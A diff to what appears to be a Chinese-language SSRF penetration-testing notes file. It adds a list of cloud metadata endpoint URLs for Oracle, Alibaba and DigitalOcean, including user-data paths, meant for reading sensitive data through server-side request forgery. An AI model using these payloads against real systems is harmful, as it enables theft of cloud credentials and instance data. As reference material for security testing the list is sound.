@@ -105,6 +105,34 @@ cat parameters.txt | gf ssrf | anew -q ssrf.txt
 
 
 
+## 云端利用读取敏感数据
+
+```
+#Oracle Cloud
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+
+#Alibaba (2/4)
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+
+#Digital Ocean (3/4)
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+
+(4/4)
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+```
+
+
+
 ## 相关的在线工具
 
 记录触发点:
